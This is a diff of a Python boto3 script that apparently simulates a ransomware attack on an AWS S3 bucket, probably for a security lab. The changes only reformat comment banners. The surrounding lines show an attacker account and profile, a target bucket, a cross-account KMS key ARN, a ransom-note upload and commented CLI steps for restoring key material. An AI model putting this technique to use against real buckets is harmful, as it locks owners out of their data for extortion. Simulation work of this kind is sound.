@@ -2,16 +2,16 @@
 
 import boto3
 
-#################################
-############ Config #############
-#################################
+##################################################
+################################################## Config ##################################################
+##################################################
 aws_attacker_cli_profile = 'dev-test'
 aws_attacker_account = '997124715511'
 aws_target_cli_profile = 'target'  # The AWS CLI profile to use for the attack
 bucket_name = 'attacksurface-target-s3-bucket-gpt7gm3l'  # The S3 bucket to target with the attack
 key_id = '10d590ca-869e-47fd-a1cf-6e27c4628318'
 kms_key_arn = f'arn:aws:kms:us-east-1:{aws_attacker_account}:key/{key_id}' 
-#################################
+##################################################
 
 # to test encrypted file try to read with target account user
 # aws s3 cp s3://proservlab-s3-bucket-to-target/file_uploaded_by_boto3.txt -
@@ -38,9 +38,9 @@ print(f'Uploaded ransom-note.txt')
 #     KeyId=key_id
 # )
 
-############################
+##################################################
 # restore key material
-############################
+##################################################
 # # generate import params
 # export KEY=`aws kms --profile=dev-test --region us-east-1 get-parameters-for-import --key-id ${KEY_ID} --wrapping-algorithm RSAES_OAEP_SHA_256 --wrapping-key-spec RSA_2048 --query '{Key:PublicKey,Token:ImportToken}' --output text`
 # echo "Key Import Params: ${KEY}"
